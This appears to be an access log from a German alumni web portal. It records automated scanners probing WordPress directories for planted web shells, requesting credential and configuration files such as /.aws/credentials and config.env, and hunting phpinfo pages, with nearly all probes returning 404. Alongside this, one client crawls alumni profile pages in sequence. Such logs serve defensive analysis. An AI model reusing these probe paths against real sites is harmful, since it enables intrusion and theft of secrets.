c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:16:53;/;/wp-content/plugins/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:16:53;/;/wp-content/plugins/HelloDollyV2/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:16:54;/;/wp-content/plugins/admin.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:16:54;/;/wp-content/plugins/dummyyummy/wp-signup.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:16:56;/;/wp-content/plugins/pwnd/as.php;GET;404
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:16:58;;/personen/alumni/schule/5504;GET;200
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:16:58;/;/wp-content/themes/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:16:58;/;/wp-content/themes/admin.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:16:59;/;/wp-content/themes/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:00;/;/wp-content/themes/themes.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:01;/;/wp-content/upgrade/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:01;/;/wp-content/upgrade/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:01;/;/wp-content/uploads/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:01;/;/wp-content/uploads/Geforce.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:01;/;/wp-content/uploads/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:01;/;/wp-good.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:02;/;/wp-includes/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:02;/;/wp-includes/ID3/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:02;/;/wp-includes/ID3/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:02;/;/wp-includes/IXR/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:02;/;/wp-includes/IXR/test1.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:03;/;/wp-includes/PHPMailer/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:03;/;/wp-includes/Requests/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:03;/;/wp-includes/Requests/Auth/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:03;/;/wp-includes/Requests/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:03;/;/wp-includes/SimplePie/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:03;/;/wp-includes/SimplePie/Content/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:06;/;/wp-includes/SimplePie/autoload_classmap.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:06;/;/wp-includes/SimplePie/chosen.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:07;/;/wp-includes/SimplePie/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:08;/;/wp-includes/Text/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:08;/;/wp-includes/Text/Diff/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:08;/;/wp-includes/Text/Diff/Engine/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:08;/;/wp-includes/Text/Diff/Renderer/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:08;/;/wp-includes/Text/Diff/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:08;/;/wp-includes/Text/wp-conflg.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:09;/;/wp-includes/assets/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:09;/;/wp-includes/assets/autoload_classmap.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:09;/;/wp-includes/bk/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:09;/;/wp-includes/block-bindings/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:10;/;/wp-includes/block-patterns/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:10;/;/wp-includes/block-supports/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:11;/;/wp-includes/blocks/shortcode/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:11;/;/wp-includes/certificates/;GET;404
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:17:11;;/personen/alumni/schule/5507;GET;200
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:11;/;/wp-includes/css/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:12;/;/wp-includes/css/dist/alam.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:13;/;/wp-includes/customize/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:13;/;/wp-includes/customize/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:13;/;/wp-content/cache/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:14;/;/wp-content/w3tc/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:16;/;/wp-content/et-cache/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:17;/;/wp-content/cache/supercache/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:18;/;/wp-content/wflogs/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:18;/;/wp-content/updraft/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:18;/;/wp-content/ai1wm-backups/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:19;/;/wp-content/backups-dup-lite/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:19;/;/wp-content/backup-db/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:19;/;/wp-content/uploads/woocommerce_uploads/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:22;/;/wp-content/uploads/woocommerce/;GET;404
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:17:24;;/personen/alumni/schule/5508;GET;200
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:24;/;/wp-content/uploads/wc-logs/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:24;/;/wp-includes/images/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:24;/;/wp-includes/js/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:24;/;/wp-includes/fonts/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:27;/;/wp-includes/fonts/autoload_classmap.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:27;/;/wp-includes/fonts/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:27;/;/wp-includes/html-api/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:27;/;/wp-includes/images/crystal/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:27;/;/wp-includes/images/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:28;/;/wp-includes/images/media/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:28;/;/wp-includes/images/media/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:28;/;/wp-includes/images/smilies/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:28;/;/wp-includes/images/wlw/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:28;/;/wp-includes/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:28;/;/wp-includes/js/codemirror/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:28;/;/wp-includes/js/crop/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:29;/;/wp-includes/js/jcrop/jcrop.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:29;/;/wp-includes/php-compat/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:29;/;/wp-includes/pomo/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:29;/;/wp-includes/random_compat/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:29;/;/wp-includes/rest-api/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:29;/;/wp-includes/rest-api/endpoints/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:32;/;/wp-includes/rest-api/fields/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:32;/;/wp-includes/rest-api/search/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:32;/;/wp-includes/sitemaps/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:32;/;/wp-includes/sitemaps/autoload_classmap.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:33;/;/wp-includes/sitemaps/providers/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:33;/;/wp-includes/sodium_compat/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:33;/;/wp-includes/sodium_compat/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:33;/;/wp-includes/sodium_compat/src/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:34;/;/wp-includes/style-engine/index.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:34;/;/wp-includes/style-engine/wp-conflg.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:34;/;/wp-includes/theme-compat/;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:34;/;/wp-includes/widgets/autoload_classmap.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:34;/;/wp-mail.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:34;/;/wp-signin.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:35;/;/wp-update.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:35;/;/wp.php;GET;404
c842d27d507a878d71047884bb37d0f611308dbe1eaf68d33ae1b5792aab8482;2025-11-29 02:17:35;/;/xmrlpc.php;GET;404
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:17:37;;/personen/alumni/schule/59000;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:17:50;;/personen/alumni/schule/59013;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:18:05;;/personen/alumni/schule/59026;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:18:19;;/personen/alumni/schule/59043;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:18:33;;/personen/alumni/schule/610021;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:18:49;;/personen/alumni/schule/620014;GET;200
72cce75e53c77717dba548116856fa2182be72980313a5b938eacc7a56065ca4;2025-11-29 02:19:00;;/.aws/credentials;GET;404
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:19:05;;/personen/alumni/schule/65262;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:19:21;;/personen/alumni/schule/65286;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:19:35;;/personen/alumni/schule/68457;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:19:49;;/personen/alumni/schule/9009;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:20:04;;/personen/alumni/schule/BW001;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:20:31;;/personen/alumni/schule/HB0001;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:20:48;;/personen/alumni/schule/HB0002;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:21:02;;/personen/alumni/schule/HS001;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:21:14;;/personen/alumni/schule/HS002;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:21:28;;/personen/alumni/schule/MP001;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:21:42;;/personen/alumni/schule/MP004;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:21:55;;/personen/alumni/schule/SHH001;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:22:08;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:22:21;;/themen/details/abschied-aus-moabit;GET;200
fc35ef93448f21ea1536a5c42f35c4c9fc6227b2d48dba1173b90c5df464eab5;2025-11-29 02:22:24;;/veranstaltungen;GET;200
0c8f3a6001f83692eb3e5617555c6d9889d19f11d8f37ecf69f1b3a68259de62;2025-11-29 02:22:28;;/personen/alumni/schule/5826;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:22:35;;/themen/details/david-gegen-goliath;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:22:49;;/themen/details/erfolgreich-durch-die-abiturprufungen;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:23:02;;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-29 02:23:13;/?XDEBUG_SESSION_START=phpstorm;/?XDEBUG_SESSION_START=phpstorm;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:23:15;;/themen/details/was-kommt-nach-dem-abitur;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:23:33;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:23:48;;/themen?category=bildung;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:24:02;;/themen?category=kultur;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:24:18;;/themen?category=wissenschaft;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:24:34;;/veranstaltungen;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:24:48;;/personen/alumni/schule/4340014;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:25:06;;/personen/alumni/details/jana-zenker;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:25:23;;/veranstaltungen/details/wohnzimmerkonzert;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:25:37;;/themen/details/der-start-ins-studium;GET;200
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:25:50;;/gruppen/hobby/abschlussfest;GET;302
d241249d44420c132c520b8684ce618b41b00d2464ee01d1c8e43412499289cb;2025-11-29 02:26:04;;/profile;GET;302
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:33:45;;/;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:33:47;;/;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:33:50;;/aktuelles/stellenangebote;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:33:50;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:33:50;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:33:50;;/themen/details/abschied-aus-moabit;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:33:50;;/personen;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:33:50;;/themen/details/der-start-ins-studium;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:33:50;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:33:57;;/phpinfo;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:03;;/phpinfo;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:08;;/phpinfo;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:08;;/phpinfo.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:33;;/_phpinfo.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:34;;/_profiler/phpinfo;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:34;;/_profiler/phpinfo/info.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:34;;/_profiler/phpinfo/phpinfo.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:34;;/wp-config;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:34;;/aws-secret.yaml;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:34;;/env.backup;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:34;;/xampp/phpinfo.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:34;;/lara/info.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:34;;/lara/phpinfo.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:35;;/laravel/info.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:35;;/api/shared/config/config.env;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:35;;/api/shared/config.env;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:35;;/config.env;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:35;;/api/config.env;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:35;;/service/email_service.py;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:36;;/server/config/database.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:37;;/scripts/nodemailer.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:37;;/.aws/credentials;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:37;;/info.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:37;;/dashboard/phpinfo.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:37;;/static/js/main.141b0494.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:37;;/static/js/2.ca066a4b.chunk.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:37;;/static/js/main.e85f7a37.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:37;;/admin/server_info.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:37;;/server_info.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:37;;/app_dev.php/_profiler/phpinfo;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:37;;/test.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:37;;/server-info;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:37;;/server-info.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:37;;/secured/phpinfo.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:37;;/config.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:38;;/server.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:38;;/appsettings.json;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:38;;/shared/config/config.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:38;;/config/aws.yml;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:38;;/settings.py;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:38;;/config.json;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:38;;/main.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:38;;/config/constants.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:38;;/application.properties;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:39;;/public/js/main.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:39;;/js/main.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:39;;/?phpinfo=1;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:39;;/storage/logs/laravel.log;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:39;;/karma.conf.json;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:39;;/swagger.json;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:39;;/swagger.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-29 02:34:39;;/gatsby-config.js;GET;404
